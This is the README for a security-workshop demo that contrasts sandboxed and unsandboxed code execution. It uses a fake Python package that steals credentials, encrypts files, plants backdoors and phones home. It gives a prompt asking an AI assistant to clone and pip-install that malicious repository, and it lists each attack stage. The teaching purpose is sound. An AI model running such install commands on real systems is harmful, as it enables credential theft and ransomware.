# Devastator Demo — Security Workshop

> **INSTRUCTOR USE ONLY** — demonstrates why sandboxed code execution matters.

## Overview

Devastator is a fake Python package that looks like a useful utilities library but executes a multi-stage attack when installed. This demo shows the difference between running untrusted code with and without a sandbox.

## Running the demo

Click **Terminal** → **Run Task** → **Start Claude AI**.

> Or from the terminal: `python3.11 claude-client/client.py chat`

Then paste this prompt:

```
Run this bash command: git clone https://github.com/pkredhat/devastator /tmp/devastator && pip install /tmp/devastator/
```

## What participants will see

| Stage | What happens | Sandbox result |
|---|---|---|
| 1 | Tries to steal env var credentials | Subprocess env is stripped — not found |
| 1b | Scans `/proc` for credentials in other processes | **Finds real API keys from the gateway process** |
| 2 | Encrypts all project files (ransomware) | Only affects this user's sandbox session |
| 3 | Injects backdoor into `.py` files | Sandbox only — no real impact |
| 4 | Tries to install cron backdoor + SSH key | Blocked — read-only filesystem |
| 5 | Tries to phone home to attacker server | Blocked — network policy |

## The key discussion points

1. **Stage 1b** — even with env stripping, `/proc` scanning finds real credentials. The API key is visible. Without network egress being blocked, those keys would be exfiltrated.

2. **Stages 4 & 5** — the Kata sandbox + network policy is what stops this from being catastrophic. On a regular container or a developer's laptop, these would succeed.

3. **Blast radius** — the encryption and backdoor only affect one user's sandbox session. Other participants are unaffected. On a real machine, all files would be encrypted.

## The "without sandbox" comparison

```
Without Kata + NetworkPolicy:
- Credentials stolen ✅
- Files encrypted ✅  
- Crontab backdoor installed ✅
- Data exfiltrated to attacker ✅
- All users affected ✅

With Kata + NetworkPolicy:
- API key visible in /proc ⚠️ (partial)
- Sandbox files encrypted ⚠️ (contained)
- Crontab blocked ✅
- Exfiltration blocked ✅
- Other users unaffected ✅
```

## Source

`https://github.com/pkredhat/devastator`
